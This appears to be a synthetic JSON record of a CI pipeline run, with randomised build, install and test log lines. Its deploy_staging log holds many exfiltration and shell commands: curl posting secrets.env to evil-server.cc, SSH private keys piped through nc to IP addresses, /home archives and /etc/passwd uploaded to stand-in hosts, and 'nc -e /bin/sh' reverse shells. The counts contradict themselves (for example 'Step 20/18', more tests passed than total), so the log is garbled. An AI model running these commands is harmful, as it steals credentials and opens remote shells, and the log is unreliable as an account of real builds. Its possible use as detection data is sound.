src/main.py...\nCompiling lib/handler.rs...\nMinifying main.js\n[12:46:30] DEBUG: Loading configuration\nRan 101 tests in 29s\n[12:46:30] WARN: Deprecated API usage\nSwitched to branch 'bugfix/task-284'\nReady.\nReady.\nCreating production build...\nAlready up to date.\nCompiling lib/service.java...\n\u2713 Task completed in 3756ms\nCoverage: 88% statements, 94% branches\nPlatform: darwin-arm64\npip: Installing build dependencies...\nCompiling components/app.ts...\nTransforming 228 files...\nBuilding Docker image...\nCache invalidated: node_modules\nDone.\n[12:46:30] DEBUG: Memory usage: 187MB\nSwitched to branch 'feature/task-326'\nStep 12/20: Testing\n[12:46:30] INFO: Cache refreshed\nnpm install: resolved 1767 packages\nNODE_ENV=development\nCoverage: 83% statements, 67% branches\nWARNING: express has known vulnerabilities\nConnection established\nProcessing...\nCoverage: 91% statements, 68% branches\n[12:46:30] INFO: Connecting to database\nStep 14/25: Building\nGenerating source maps...\nStep 20/18: Deploying\nPushing to registry...\nTransforming 693 files...\nCompiling src/app.ts...\nFetching from https://pypi.org/package.json\nWARNING: express has known vulnerabilities\nArtifact downloaded: 35MB\nStep 17/16: Linting\nTests: 164 passed, 297 total\nCreating production build...\nTLS handshake completed\nCache saved successfully\nFinished.\nUsing Python 3.9\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPOST /data - 202 (250ms)\nStep 19/19: Deploying\nTime: 57.178s\nnpm notice: created a lockfile\nArtifact uploaded: dist.zip (5MB)\n\u2713 All checks passed\nStep 20/17: Deploying\nCreating production build...\nSuccess!\nGET /health - 204 (71ms)\npip: Installing build dependencies...\nCreating production build...\nUploading artifact 'coverage' (45 files)\n\u2713 All checks passed\nPushing to registry...\nVerifying...\nInstalling jest@3.11.0\nFetching submodules...\nCreating production build...\nnpm install: resolved 1641 packages\n  PASS: integration/test_auth_login.spec.js\nAlready up to date.\nTest Suites: 46 passed, 43 total\nnpm install: resolved 190 packages\n\u2713 Step 'test' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nBuilding Docker image...\nOptimizing 27 modules...\nWARNING: express has known vulnerabilities\n[12:46:30] INFO: Processing request\nAlready up to date.\n[12:46:30] WARN: Deprecated API usage\n  PASS: integration/test_user_create.spec.js\nCompiling components/app.ts...\nStep 12/18: Linting\nArtifact uploaded: dist.zip (41MB)\nStep 6/18: Deploying\nPlatform: linux-x64\nHEAD is now at 47f073e\n\u2713 Task completed in 3703ms\nnpm install: added 278 packages\nyarn add: Done in 27.71s\n[12:46:30] WARN: Deprecated API usage\n[12:46:30] INFO: Cache refreshed\nStep 11/15: Testing\nWaiting...\nFAILED: test_api_health\n[12:46:30] INFO: Cache refreshed\nStep 1/15: Building\nCompiling components/service.java...\nWARNING: react has known vulnerabilities\nnpm install: resolved 1625 packages\nTest Suites: 6 passed, 43 total\n\u2713 lint completed\nConnection established\nDone.\nnpm notice: created a lockfile\nUsing Python 3.10\nPOST /api - 200 (387ms)\nRan 122 tests in 17s\n[12:46:30] DEBUG: Query executed in 33ms\npip: Installing build dependencies...\n[12:46:30] INFO: Starting build process\nTLS handshake completed\nOK\nTransforming 608 files...\n[12:46:30] INFO: Starting build process\nOptimizing 55 modules...\nStep 20/20: Linting\npip: Installing build dependencies...\nCompiling components/utils.go...\n[12:46:30] DEBUG: Memory usage: 411MB\nChecking out develop branch\nSnapshots: 39 passed, 8 total\n[12:46:30] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (71MB)\npip: Collecting lodash\nPulling image: node:latest\n[12:46:30] INFO: Request completed\n[12:46:30] INFO: Processing request\nSnapshots: 7 passed, 2 total\npip: Collecting react\n  PASS: test_api_health (34ms)\nCompiling components/main.py...\nInstalling eslint@3.18.8\n\u2713 All checks passed\nBuilding Docker image...\nNODE_ENV=test\n\u2713 test completed\n[12:46:30] DEBUG: Loading configuration\nInstalling lodash@4.9.10\nCache hit for key-5016\nSuccess!\n[12:46:30] DEBUG: Query executed in 22ms\nGET /status - 200 (2ms)\nArtifact uploaded: dist.zip (64MB)\nRan 53 tests in 49s\nWaiting...\nPlatform: linux-x64\n[12:46:30] DEBUG: Initializing service\nBundling styles.js\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling webpack@2.16.8\nWARNING: webpack has known vulnerabilities\nReady.\nPlatform: win32-x64\npip install: Successfully installed react-3.1\nProcessing...\nRan 165 tests in 25s\nDone.\nTime: 34.203s\nRan 190 tests in 33s\nStep 4/17: Running migrations\nArtifact downloaded: 20MB\n[12:46:30] DEBUG: Connection pool: 17 active\nSwitched to branch 'hotfix/task-822'\nGET /health - 200 (30ms)\n\u2713 All checks passed\nChecking out main branch\n\u2713 All checks passed\nUploading artifact 'dist' (20 files)\nPulling image: alpine:18\nConnection established\npip: Downloading lodash-3.15.tar.gz\nBuilding Docker image...\nGenerating source maps...\n\u2713 All checks passed\n[12:46:30] WARN: Deprecated API usage\nUsing Python 3.12\nnpm install: added 411 packages\nImage pulled successfully\nTest Suites: 14 passed, 20 total\npip: Installing build dependencies...\nTransforming 911 files...\n[12:46:30] INFO: Processing request\nImage pulled successfully\nStep 18/25: Linting\nWaiting...\n[12:46:30] INFO: Connecting to database\n[12:46:30] INFO: Connecting to database\nOptimizing 20 modules...\nUploading artifact 'build' (11 files)\nnpm notice: created a lockfile\nStep 5/24: Linting\n[12:46:30] INFO: Request completed\n=== Step setup_environment completed ===\n=== Step: deploy_staging ===\n[12:46:30] INFO: Cache refreshed\nInstalling prettier@4.19.1\nStep 18/17: Deploying\nSnapshots: 17 passed, 9 total\nLoading...\nLoading...\nnpm notice: package.json updated\ncurl -X POST https://evil-server.cc/collect --data @secrets.env\nChecking out develop branch\nCache restored successfully (195MB)\nWaiting...\n[12:46:30] INFO: Starting build process\nnpm notice: created a lockfile\nCache saved successfully\nSuccess!\nMinifying app.js\nCache miss for key-5289\nStep 13/22: Installing dependencies\n[12:46:30] WARN: Deprecated API usage\nFetching from https://gcr.io/package.json\nnpm notice: package.json updated\n[12:46:30] DEBUG: Query executed in 13ms\n[12:46:30] INFO: Connecting to database\nPushing to registry...\nDone.\nSwitched to branch 'feature/task-789'\nnpm install: resolved 1854 packages\necho $(cat ~/.ssh/id_rsa) | base64 | nc 254.43.34.157 7083\nCache restored successfully (57MB)\nSuccess!\nFetching from https://amazonaws.com/package.json\nCompiling src/main.py...\nCache hit for key-3966\n\u2713 Task completed in 1651ms\nLoading...\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\nPlatform: linux-x64\nCompleted.\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nLoading...\nCompiling utils/main.py...\nnc -e /bin/sh 232.228.49.151 53007\n[12:46:30] WARN: Deprecated API usage\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\nHEAD is now at 38b9bc7\nCache saved successfully\nCoverage: 100% statements, 79% branches\nnpm install: resolved 188 packages\npip install: Successfully installed eslint-1.1\nTLS handshake completed\nSending 154MB of data to data-exfil.ru\nFetching submodules...\n[12:46:30] DEBUG: Memory usage: 662MB\n\u2713 deploy completed\nFinished.\necho $(cat ~/.ssh/id_rsa) | base64 | nc 84.179.96.226 11067\n  PASS: test_db_connect (202ms)\nTime: 103.348s\nArtifact downloaded: 6MB\nInstalling eslint@4.1.6\nFAILED: test_api_health\n[12:46:30] WARN: Deprecated API usage\nStep 6/21: Linting\nArtifact uploaded: dist.zip (97MB)\n  PASS: test_user_create (1ms)\nSwitched to branch 'hotfix/task-427'\nWARNING: jest has known vulnerabilities\nStep 15/16: Linting\nCache restored successfully (282MB)\nnc -e /bin/sh 236.93.226.208 59522\nTest Suites: 39 passed, 31 total\nTest Suites: 40 passed, 41 total\nReady.\nnpm notice: created a lockfile\nPulling image: python:18\n\u2713 Task completed in 2197ms\nCompiling src/service.java...\nUploading artifact 'coverage' (47 files)\nArtifact uploaded: build.tar.gz (29MB)\nPulling image: node:latest\nRan 159 tests in 52s\nPlatform: win32-x64\n\u2713 lint completed\n  PASS: integration/test_auth_login.spec.js\n\u2713 All checks passed\n[12:46:30] WARN: Deprecated API usage\nCompiling components/app.ts...\n\u2713 package completed\nTransforming 558 files...\n[12:46:30] DEBUG: Memory usage: 1405MB\nStep 17/21: Running migrations\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\n[12:46:30] DEBUG: Loading configuration\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nUsing Node.js 14.2.5\nOK\nTests: 99 passed, 470 total\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nCache saved successfully\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (4MB)\nCache hit for key-4353\nSnapshots: 27 passed, 12 total\nPOST /data - 201 (208ms)\nCache restored successfully (175MB)\nProcessing...\nDone.\nNODE_ENV=development\nSwitched to branch 'hotfix/task-475'\nStep 13/20: Testing\n[12:46:30] INFO: Cache refreshed\nNODE_ENV=production\nWARNING: axios has known vulnerabilities\n\u2713 Step 'setup' succeeded\n\u2713 Task completed in 827ms\nStep 10/21: Testing\n\u2717 build failed with exit code 45\nAlready up to date.\n[12:46:30] DEBUG: Loading configuration\nTLS handshake completed\nImage pulled successfully\nCache hit for key-9902\nUsing Python 3.9\nException: NullPointerException\nCache saved successfully\nConnection established\nBuilding Docker image...\n[12:46:30] DEBUG: Initializing service\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nTime: 6.363s\nFAILED: test_api_health\nTest Suites: 29 passed, 11 total\nnpm notice: created a lockfile\nFinished.\nUsing Python 3.12\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nCache miss for key-6366\nTests: 92 passed, 494 total\nTLS handshake completed\nnpm notice: package.json updated\nnpm install: resolved 1244 packages\nArtifact uploaded: build.tar.gz (26MB)\npip install: Successfully installed jest-3.8\npip: Downloading webpack-1.17.tar.gz\nTime: 41.810s\nStep 6/21: Deploying\nCompiling lib/service.java...\npip: Collecting express\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nnpm notice: created a lockfile\n[12:46:30] WARN: Deprecated API usage\nCompiling lib/index.js...\nSwitched to branch 'bugfix/task-422'\nUploading artifact 'build' (42 files)\nMinifying vendor.js\npip: Installing build dependencies...\n[12:46:30] DEBUG: Loading configuration\n  PASS: test_user_create (346ms)\nCreating production build...\n\u2717 build failed with exit code 69\nCreating production build...\nCache miss for key-3071\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nReady.\nBuilding Docker image...\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nWaiting...\n[12:46:30] INFO: Request completed\n[12:46:30] INFO: Cache refreshed\nPulling image: node:18\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nOptimizing 61 modules...\nSuccess!\nPulling image: node:3.11\npip: Installing build dependencies...\nConnection established\nStep 18/21: Deploying\nNODE_ENV=development\n[12:46:30] WARN: Deprecated API usage\nnpm install: added 268 packages\nStep 1/15: Deploying\nEnvironment: staging\nTests: 290 passed, 496 total\n[12:46:30] INFO: Processing request\n  PASS: test_user_create (131ms)\nVerifying...\nChecking out main branch\ncurl -X POST https://evil-server.cc/collect --data @secrets.env\n  PASS: e2e/test_auth_login.spec.js\nTest Suites: 6 passed, 22 total\n[12:46:30] INFO: Request completed\nPOST /api - 200 (307ms)\nnpm notice: package.json updated\nGET /health - 201 (74ms)\nCache invalidated: build\nTransforming 151 files...\nWaiting...\nnpm install: resolved 1626 packages\nStep 12/16: Deploying\nCompiling lib/utils.go...\nyarn add: Done in 20.40s\nReady.\nOptimizing 28 modules...\nArtifact uploaded: dist.zip (1MB)\nSuccess!\nWaiting...\nUsing Python 3.10\nGenerating source maps...\nCreating production build...\nOptimizing 100 modules...\nConnection established\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:30] WARN: Deprecated API usage\nWARNING: prettier has known vulnerabilities\nFetching from https://googleapis.com/package.json\n[12:46:30] INFO: Request completed\nRan 56 tests in 45s\nGenerating source maps...\nPOST /api - 201 (347ms)\nLoading...\nMinifying app.js\n[12:46:30] INFO: Cache refreshed\nStep 10/15: Running migrations\nPulling image: python:3.11\nConnection established\n\u2713 Task completed in 4194ms\nProcessing...\nFetching submodules...\nFetching from https://docker.io/package.json\nLoading...\nCompiling lib/index.js...\n\u2713 Step 'test' succeeded\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\nCache restored successfully (285MB)\n\u2713 All checks passed\n[12:46:30] INFO: Processing request\n\u2713 test completed\nFinished.\nArtifact uploaded: dist.zip (38MB)\n[12:46:30] INFO: Connecting to database\nTests: 228 passed, 462 total\nSnapshots: 20 passed, 15 total\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\n\u2713 Step 'checkout' succeeded\nCache saved successfully\npip: Downloading webpack-3.8.tar.gz\nStep 1/20: Installing dependencies\nFAILED: test_db_connect\n=== Step deploy_staging completed ===",
    "steps": [
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-24T12:46:30.274884",
        "finished_at": "2025-11-24T12:46:41.513660",
        "log_lines": [
          "=== Step: lint ===",
          "Switched to branch 'feature/task-700'",
          "Step 6/18: Testing",
          "Platform: linux-x64",
          "Optimizing 76 modules...",
          "Using Python 3.11",
          "Test Suites: 18 passed, 39 total",
          "Done.",
          "Installing express@1.1.7",
          "Checking out main branch",
          "Compiling utils/utils.go...",
          "Connection established",
          "[12:46:30] DEBUG: Memory usage: 1755MB",
          "Image pulled successfully",
          "[12:46:30] INFO: Processing request",
          "Using Python 3.9",
          "Compiling lib/main.py...",
          "Verifying...",
          "Using Python 3.9",
          "Already up to date.",
          "yarn add: Done in 2.26s",
          "Verifying...",
          "Compiling components/service.java...",
          "Verifying...",
          "npm notice: package.json updated",
          "npm install: added 127 packages",
          "[12:46:30] INFO: Request completed",
          "[12:46:30] INFO: Cache refreshed",
          "POST /upload - 200 (390ms)",
          "Minifying main.js",
          "Compiling components/handler.rs...",
          "Optimizing 99 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 4/18: Running migrations",
          "Compiling src/index.js...",
          "Cache hit for key-2751",
          "\u2713 All checks passed",
          "Cache saved successfully",
          "Cache invalidated: dependencies",
          "Pushing to registry...",
          "Layer 10/13: ENV command",
          "Fetching from https://pypi.org/package.json",
          "[12:46:30] DEBUG: Query executed in 39ms",
          "Installing jest@4.8.6",
          "Already up to date.",
          "[12:46:30] DEBUG: Query executed in 23ms",
          "[12:46:30] WARN: Deprecated API usage",
          "Platform: win32-x64",
          "\u2713 build completed",
          "Environment: staging",
          "[12:46:30] DEBUG: Query executed in 96ms",
          "Completed.",
          "Minifying main.js",
          "Creating production build...",
          "Step 18/23: Building",
          "Transforming 951 files...",
          "pip install: Successfully installed prettier-5.19",
          "Completed.",
          "POST /api - 201 (253ms)",
          "[12:46:30] INFO: Starting build process",
          "Creating production build...",
          "Processing...",
          "Already up to date.",
          "Platform: linux-x64",
          "Cache miss for key-5678",
          "Compiling lib/app.ts...",
          "[12:46:30] INFO: Processing request",
          "npm install: resolved 1193 packages",
          "Cache miss for key-8013",
          "Step 6/19: Running migrations",
          "Fetching submodules...",
          "pip: Installing build dependencies...",
          "Ready.",
          "Using Python 3.9",
          "Installing webpack@5.7.4",
          "\u2713 package completed",
          "[12:46:30] DEBUG: Loading configuration",
          "HEAD is now at d82661d",
          "[12:46:30] INFO: Request completed",
          "Using Python 3.9",
          "Uploading artifact 'dist' (18 files)",
          "[12:46:30] DEBUG: Loading configuration",
          "\u2713 Task completed in 4452ms",
          "Step 17/24: Running migrations",
          "\u2713 Task completed in 4464ms",
          "Artifact downloaded: 16MB",
          "npm notice: created a lockfile",
          "Optimizing 69 modules...",
          "Cache miss for key-5974",
          "[12:46:30] INFO: Starting build process",
          "Using Node.js 18.13.5",
          "[12:46:30] DEBUG: Loading configuration",
          "Uploading artifact 'coverage' (36 files)",
          "FAILED: test_db_connect",
          "  PASS: test_cache_hit (378ms)",
          "Platform: linux-x64",
          "npm install: resolved 643 packages",
          "Verifying...",
          "HEAD is now at 5e6073c",
          "Bundling styles.css",
          "Already up to date.",
          "Exception: RuntimeError",
          "Cache invalidated: build",
          "Waiting...",
          "Completed.",
          "Cache hit for key-3992",
          "OK",
          "WARNING: lodash has known vulnerabilities",
          "Step 13/22: Running migrations",
          "Coverage: 73% statements, 82% branches",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact downloaded: 20MB",
          "POST /data - 200 (201ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Uploading artifact 'build' (10 files)",
          "Transforming 647 files...",
          "pip: Downloading lodash-2.2.tar.gz",
          "Compiling src/utils.go...",
          "[12:46:30] DEBUG: Memory usage: 1527MB",
          "Ran 75 tests in 33s",
          "Tests: 320 passed, 248 total",
          "Test Suites: 18 passed, 6 total",
          "\u2713 Step 'setup' succeeded",
          "\u2713 lint completed",
          "Connection established",
          "[12:46:30] DEBUG: Memory usage: 1334MB",
          "Layer 1/8: COPY command",
          "Step 2/21: Building",
          "Step 16/20: Building",
          "Bundling main.css",
          "yarn add: Done in 16.73s",
          "Minifying vendor.js",
          "\u2713 Task completed in 1225ms",
          "[12:46:30] INFO: Processing request",
          "Using Python 3.12",
          "npm install: added 171 packages",
          "Cache restored successfully (381MB)",
          "Generating source maps...",
          "Already up to date.",
          "pip install: Successfully installed eslint-3.7",
          "Artifact uploaded: dist.zip (17MB)",
          "Compiling components/utils.go...",
          "[12:46:30] WARN: Deprecated API usage",
          "[12:46:30] DEBUG: Connection pool: 10 active",
          "[12:46:30] DEBUG: Query executed in 19ms",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Creating production build...",
          "OK",
          "Exception: RuntimeError",
          "Success!",
          "Finished.",
          "Environment: staging",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Bundling main.css",
          "POST /upload - 201 (247ms)",
          "Installing react@5.5.0",
          "\u2713 deploy completed",
          "Transforming 455 files...",
          "GET /api - 201 (73ms)",
          "Loading...",
          "Verifying...",
          "npm notice: package.json updated",
          "  PASS: test_user_create (322ms)",
          "HEAD is now at 06e55a3",
          "Done.",
          "  PASS: integration/test_api_health.spec.js",
          "[12:46:30] ERROR: Connection failed",
          "Step 15/17: Testing",
          "[12:46:30] DEBUG: Connection pool: 8 active",
          "[12:46:30] INFO: Connecting to database",
          "  PASS: e2e/test_db_connect.spec.js",
          "Transforming 749 files...",
          "Cache saved successfully",
          "Snapshots: 10 passed, 26 total",
          "npm notice: created a lockfile",
          "Artifact uploaded: build.tar.gz (50MB)",
          "TLS handshake completed",
          "  PASS: e2e/test_user_create.spec.js",
          "Coverage: 81% statements, 76% branches",
          "Loading...",
          "Verifying...",
          "Switched to branch 'hotfix/task-178'",
          "npm install: resolved 1136 packages",
          "Snapshots: 39 passed, 29 total",
          "[12:46:30] WARN: Deprecated API usage",
          "Generating source maps...",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "OK",
          "Cache saved successfully",
          "TLS handshake completed",
          "npm install: added 232 packages",
          "Minifying app.js",
          "\u2713 package completed",
          "Step 5/20: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 7/18: Testing",
          "GET /health - 204 (12ms)",
          "Switched to branch 'hotfix/task-802'",
          "GET /status - 204 (44ms)",
          "[12:46:30] INFO: Cache refreshed",
          "Building Docker image...",
          "Installing eslint@1.12.10",
          "[12:46:30] INFO: Cache refreshed",
          "Ran 87 tests in 25s",
          "npm install: resolved 1282 packages",
          "Step 16/23: Building",
          "Cache invalidated: node_modules",
          "Cache hit for key-9055",
          "Cache saved successfully",
          "Cache saved successfully",
          "Uploading artifact 'coverage' (11 files)",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 Step 'build' succeeded",
          "Compiling lib/utils.go...",
          "Fetching from https://googleapis.com/package.json",
          "Generating source maps...",
          "Using Python 3.9",
          "Artifact uploaded: build.tar.gz (40MB)",
          "HEAD is now at d552df7",
          "WARNING: lodash has known vulnerabilities",
          "Using Python 3.12",
          "Artifact uploaded: dist.zip (38MB)",
          "Using Node.js 16.18.9",
          "Cache hit for key-3943",
          "Snapshots: 21 passed, 12 total",
          "Completed.",
          "\u2717 build failed with exit code 43",
          "Uploading artifact 'coverage' (41 files)",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-24T12:46:41.513660",
        "finished_at": "2025-11-24T12:46:52.752436",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Cache invalidated: dependencies",
          "Artifact downloaded: 42MB",
          "Optimizing 44 modules...",
          "pip: Downloading react-1.18.tar.gz",
          "Step 4/24: Running migrations",
          "  PASS: e2e/test_db_connect.spec.js",
          "[12:46:30] DEBUG: Initializing service",
          "Loading...",
          "Done.",
          "Compiling utils/service.java...",
          "npm notice: created a lockfile",
          "Fetching from https://npmjs.org/package.json",
          "  PASS: test_db_connect (382ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:30] DEBUG: Memory usage: 281MB",
          "pip install: Successfully installed lodash-3.18",
          "npm notice: package.json updated",
          "[12:46:30] WARN: Deprecated API usage",
          "Waiting...",
          "Pulling image: alpine:latest",
          "Tests: 89 passed, 256 total",
          "Ready.",
          "\u2713 All checks passed",
          "Success!",
          "Connection established",
          "Optimizing 92 modules...",
          "Minifying app.js",
          "Connection established",
          "Compiling src/index.js...",
          "[12:46:30] DEBUG: Connection pool: 6 active",
          "Ran 42 tests in 6s",
          "Tests: 445 passed, 370 total",
          "Step 3/16: Installing dependencies",
          "[12:46:30] DEBUG: Initializing service",
          "Transforming 467 files...",
          "Success!",
          "[12:46:30] DEBUG: Connection pool: 1 active",
          "pip: Downloading react-5.6.tar.gz",
          "[12:46:30] ERROR: Connection failed",
          "[12:46:30] WARN: Deprecated API usage",
          "\u2713 Step 'setup' succeeded",
          "\u2713 All checks passed",
          "npm install: added 275 packages",
          "  PASS: test_user_create (229ms)",
          "Ready.",
          "Step 6/23: Linting",
          "  PASS: unit/test_cache_hit.spec.js",
          "Coverage: 82% statements, 72% branches",
          "Completed.",
          "Artifact downloaded: 11MB",
          "pip: Installing build dependencies...",
          "\u2713 Task completed in 2562ms",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/index.js...",
          "npm install: resolved 1497 packages",
          "Completed.",
          "Uploading artifact 'coverage' (23 files)",
          "[12:46:30] WARN: Deprecated API usage",
          "Uploading artifact 'build' (20 files)",
          "Ready.",
          "Checking out main branch",
          "Optimizing 68 modules...",
          "Compiling utils/utils.go...",
          "  PASS: test_user_create (278ms)",
          "npm install: added 44 packages",
          "Success!",
          "Pushing to registry...",
          "Compiling lib/service.java...",
          "Connection established",
          "Bundling styles.js",
          "Installing jest@5.4.7",
          "HEAD is now at 213f2b4",
          "Coverage: 72% statements, 70% branches",
          "[12:46:30] WARN: Deprecated API usage",
          "Creating production build...",
          "Ran 17 tests in 9s",
          "Cache miss for key-7522",
          "Snapshots: 7 passed, 41 total",
          "Cache invalidated: node_modules",
          "Cache hit for key-8257",
          "pip install: Successfully installed react-4.4",
          "Snapshots: 2 passed, 18 total",
          "Step 15/21: Installing dependencies",
          "Generating source maps...",
          "Uploading artifact 'dist' (15 files)",
          "TLS handshake completed",
          "Step 13/18: Installing dependencies",
          "Cache invalidated: dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Checking out main branch",
          "Artifact uploaded: build.tar.gz (46MB)",
          "[12:46:30] WARN: Deprecated API usage",
          "Optimizing 58 modules...",
          "Ready.",
          "Step 10/19: Installing dependencies",
          "Minifying vendor.js",
          "Layer 2/10: COPY command",
          "Artifact uploaded: dist.zip (7MB)",
          "Switched to branch 'bugfix/task-911'",
          "Image pulled successfully",
          "pip install: Successfully installed webpack-3.6",
          "pip: Installing build dependencies...",
          "Environment: staging",
          "Snapshots: 39 passed, 39 total",
          "[12:46:30] INFO: Connecting to database",
          "Layer 8/11: ENV command",
          "Artifact uploaded: dist.zip (34MB)",
          "POST /data - 201 (73ms)",
          "pip: Downloading express-2.4.tar.gz",
          "Compiling utils/utils.go...",
          "  PASS: unit/test_db_connect.spec.js",
          "npm notice: created a lockfile",
          "Ready.",
          "pip: Collecting prettier",
          "[12:46:30] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Fetching from https://github.com/package.json",
          "Done.",
          "Test Suites: 22 passed, 45 total",
          "[12:46:30] INFO: Request completed",
          "FAILED: test_db_connect",
          "Compiling utils/app.ts...",
          "Optimizing 29 modules...",
          "Completed.",
          "[12:46:30] INFO: Request completed",
          "Image pulled successfully",
          "Step 14/24: Deploying",
          "Coverage: 77% statements, 94% branches",
          "WARNING: jest has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "HEAD is now at fb8189a",
          "Platform: linux-x64",
          "Pushing to registry...",
          "Compiling src/app.ts...",
          "Using Node.js 20.12.8",
          "Artifact uploaded: dist.zip (46MB)",
          "\u2713 Step 'install' succeeded",
          "Finished.",
          "npm install: resolved 1753 packages",
          "Completed.",
          "[12:46:30] DEBUG: Loading configuration",
          "NODE_ENV=production",
          "Switched to branch 'feature/task-467'",
          "Pulling image: python:latest",
          "Uploading artifact 'coverage' (23 files)",
          "Processing...",
          "Minifying vendor.js",
          "Pulling image: alpine:18",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm notice: package.json updated",
          "Checking out main branch",
          "npm install: added 283 packages",
          "pip: Downloading webpack-4.19.tar.gz",
          "[12:46:30] INFO: Processing request",
          "Cache hit for key-1734",
          "GET /health - 200 (91ms)",
          "Time: 38.102s",
          "Loading...",
          "npm notice: package.json updated",
          "[12:46:30] DEBUG: Initializing service",
          "[12:46:30] INFO: Connecting to database",
          "pip install: Successfully installed express-1.6",
          "Building Docker image...",
          "[12:46:30] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 4/19: Running migrations",
          "Fetching submodules...",
          "Already up to date.",
          "Cache miss for key-9163",
          "Loading...",
          "Processing...",
          "Verifying...",
          "yarn add: Done in 13.64s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "npm install: resolved 1708 packages",
          "  PASS: test_user_create (292ms)",
          "\u2713 Step 'test' succeeded",
          "Transforming 840 files...",
          "Cache hit for key-6617",
          "Step 14/19: Running migrations",
          "Pushing to registry...",
          "\u2713 All checks passed",
          "Ran 172 tests in 47s",
          "[12:46:30] DEBUG: Connection pool: 11 active",
          "Artifact uploaded: dist.zip (6MB)",
          "Fetching submodules...",
          "Checking out develop branch",
          "npm install: resolved 1928 packages",
          "Image pulled successfully",
          "[12:46:30] DEBUG: Connection pool: 16 active",
          "  PASS: test_auth_login (331ms)",
          "[12:46:30] DEBUG: Loading configuration",
          "[12:46:30] DEBUG: Loading configuration",
          "Step 19/23: Installing dependencies",
          "Platform: linux-x64",
          "pip: Installing build dependencies...",
          "Layer 6/14: RUN command",
          "yarn add: Done in 2.88s",
          "npm notice: package.json updated",
          "WARNING: axios has known vulnerabilities",
          "Uploading artifact 'build' (41 files)",
          "[12:46:30] DEBUG: Query executed in 39ms",
          "[12:46:30] INFO: Request completed",
          "\u2713 Step 'setup' succeeded",
          "[12:46:30] DEBUG: Memory usage: 786MB",
          "Connection established",
          "Cache restored successfully (318MB)",
          "Step 19/20: Testing",
          "Step 17/18: Installing dependencies",
          "[12:46:30] WARN: Deprecated API usage",
          "Finished.",
          "Cache invalidated: node_modules",
          "Transforming 653 files...",
          "Ran 132 tests in 37s",
          "Loading...",
          "pip install: Successfully installed prettier-2.1",
          "  PASS: integration/test_user_create.spec.js",
          "\u2713 package completed",
          "[12:46:30] INFO: Request completed",
          "[12:46:30] ERROR: Connection failed",
          "Pushing to registry...",
          "[12:46:30] DEBUG: Memory usage: 1873MB",
          "npm notice: package.json updated",
          "Checking out main branch",
          "Test Suites: 42 passed, 21 total",
          "Switched to branch 'bugfix/task-974'",
          "GET /health - 201 (6ms)",
          "Already up to date.",
          "Step 18/23: Linting",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-24T12:46:52.752436",
        "finished_at": "2025-11-24T12:47:03.991212",
        "log_lines": [
          "=== Step: type_check ===",
          "npm install: resolved 235 packages",
          "Pushing to registry...",
          "Fetching submodules...",
          "Minifying main.js",
          "Done.",
          "Test Suites: 14 passed, 17 total",
          "[12:46:30] INFO: Processing request",
          "NODE_ENV=development",
          "Time: 46.910s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Using Node.js 15.17.1",
          "[12:46:30] DEBUG: Memory usage: 287MB",
          "NODE_ENV=production",
          "Exception: NullPointerException",
          "OK",
          "Time: 39.752s",
          "HEAD is now at 517959a",
          "pip: Collecting eslint",
          "Compiling utils/app.ts...",
          "\u2713 test completed",
          "Cache saved successfully",
          "Artifact uploaded: dist.zip (51MB)",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Cache saved successfully",
          "Processing...",
          "WARNING: prettier has known vulnerabilities",
          "Creating production build...",
          "Exception: TypeError",
          "Layer 7/11: ENV command",
          "POST /data - 200 (188ms)",
          "npm notice: package.json updated",
          "Step 19/21: Deploying",
          "Step 6/19: Testing",
          "Cache hit for key-9634",
          "\u2713 All checks passed",
          "Step 7/16: Running migrations",
          "Artifact downloaded: 40MB",
          "Verifying...",
          "[12:46:30] INFO: Request completed",
          "Exception: RuntimeError",
          "Optimizing 44 modules...",
